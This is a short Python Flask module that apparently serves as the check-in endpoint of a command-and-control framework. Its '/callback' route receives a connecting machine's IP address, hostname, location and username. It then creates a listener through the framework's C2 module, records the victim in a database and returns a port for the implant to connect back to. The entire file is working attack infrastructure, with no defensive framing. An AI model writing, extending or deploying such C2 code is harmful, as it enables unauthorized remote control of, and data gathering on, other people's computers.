# Import necessary classes from the Flask module
from flask import Blueprint, request, jsonify

# Import createHandler function from contra.c2 module
from contra.c2 import *
from contra.dbhelper import *

# Create a blueprint object for the callback route with a URL prefix
callback_bp = Blueprint("callback", __name__, url_prefix="/callback")

# Define a function to receive data sent to the callback route via HTTP POST
@callback_bp.route('', methods=['POST'])
def receive_data():
    
    # Get the JSON data sent in the POST request and print it to the console
    f = request.get_json()
    print(f)

    # Call the createHandler function and get the port number returned
    port_number,handler_name = createHandler()

    insert_handler_data(handler_name,f['ip_address'],f['hostname'],f['location'],f['username'],port_number)
    # Return a JSON object containing the port number to the caller
    return jsonify({'port': port_number})
